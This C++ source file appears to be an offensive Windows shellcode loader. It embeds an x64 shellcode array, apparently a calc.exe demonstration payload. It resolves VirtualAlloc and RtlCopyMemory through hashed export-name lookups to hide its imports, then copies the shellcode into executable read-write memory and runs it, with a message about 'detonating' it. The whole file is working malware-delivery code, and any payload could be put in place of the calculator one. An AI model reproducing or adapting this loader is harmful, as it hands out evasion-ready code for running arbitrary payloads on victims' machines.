#include <iostream>
#include <windows.h>

UCHAR uArray[] = {
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"};

SIZE_T sArraySize = sizeof(uArray);

DWORD getHashFromString(char* string)
{
    size_t stringLength = strnlen_s(string, 50);
    DWORD hash = 0x69;

    for (size_t i = 0; i < stringLength; i++)
    {
        hash += (hash * 0xac88d37f0 + string[i]) & 0xffffff;
    }
    return hash;
}

FARPROC getFunctionAddressByHash(char* library, DWORD hash)
{
    FARPROC functionAddress = NULL;

    HMODULE libraryBase = LoadLibraryA(library);
    if (!libraryBase) {
        printf("Failed to load library: %s\n", library);
        return NULL;
    }
    printf("Successfully loaded library: %s\n", library);

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)libraryBase;
    PIMAGE_NT_HEADERS imageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)libraryBase + dosHeader->e_lfanew);

    DWORD_PTR exportDirectoryRVA = imageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;

    PIMAGE_EXPORT_DIRECTORY imageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)libraryBase + exportDirectoryRVA);
    if (!imageExportDirectory) {
        return NULL;
    }
    printf("Successfully accessed export directory for library: %s\n", library);

    PDWORD addresOfFunctionsRVA = (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfFunctions);
    PDWORD addressOfNamesRVA = (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfNames);
    PWORD addressOfNameOrdinalsRVA = (PWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfNameOrdinals);

    for (DWORD i = 0; i < imageExportDirectory->NumberOfFunctions; i++)
    {
        DWORD functionNameRVA = addressOfNamesRVA[i];
        DWORD_PTR functionNameVA = (DWORD_PTR)libraryBase + functionNameRVA;
        char* functionName = (char*)functionNameVA;

        DWORD functionNameHash = getHashFromString(functionName);

        if (functionNameHash == hash)
        {
            DWORD functionAddressRVA = addresOfFunctionsRVA[addressOfNameOrdinalsRVA[i]];
            functionAddress = (FARPROC)((DWORD_PTR)libraryBase + functionAddressRVA);
            printf("Successfully found function: %s with hash: 0x%x\n", functionName, functionNameHash);
            return functionAddress;
        }
    }
    return NULL;  // Return NULL if function is not found
}

using customVert = LPVOID(WINAPI*)( 
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD  flAllocationType,
    DWORD  flProtect
    );

using customRtB = void(NTAPI*)(
    void*       Destination,
    const void* Source,
    size_t      Length
    );

int main()
{
    FARPROC virtualAllocAddress = getFunctionAddressByHash((char*)"kernel32.dll", 0x45fbc5b);
    if (!virtualAllocAddress) {
        printf("Failed to find VirtualAlloc function in kernel32.dll with hash 0x45fbc5b\n");
        system("pause");
        return 1;
    }
    printf("Successfully found VirtualAlloc function\n");

    FARPROC rtlCopyMemoryAddress = getFunctionAddressByHash((char*)"ntdll.dll", 0x552c04f);
    if (!rtlCopyMemoryAddress) {
        printf("Failed to find RtlCopyMemory function in ntdll.dll with hash 0x552c04f\n");
        system("pause");
        return 1;
    }
    printf("Successfully found RtlCopyMemory function\n");

    customVert VirtualAlloc = (customVert)virtualAllocAddress;
    customRtB RtlCopyMemory = (customRtB)rtlCopyMemoryAddress;

    LPVOID pvExecMem = VirtualAlloc(NULL, sArraySize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (pvExecMem == NULL) {
        printf("Memory allocation failed\n");
        system("pause");
        return 1;
    }
    printf("Memory successfully allocated\n");

    RtlCopyMemory(pvExecMem, uArray, sArraySize);
    printf("Successfully copied memory\n");
    
    system("pause");

    // Add function pointer and execute the code in memory
    VOID (*fp)() = (VOID(*)())pvExecMem;
    fp();

    system("Press Enter to Detonate Shellcode:");
    
    return 0;
}
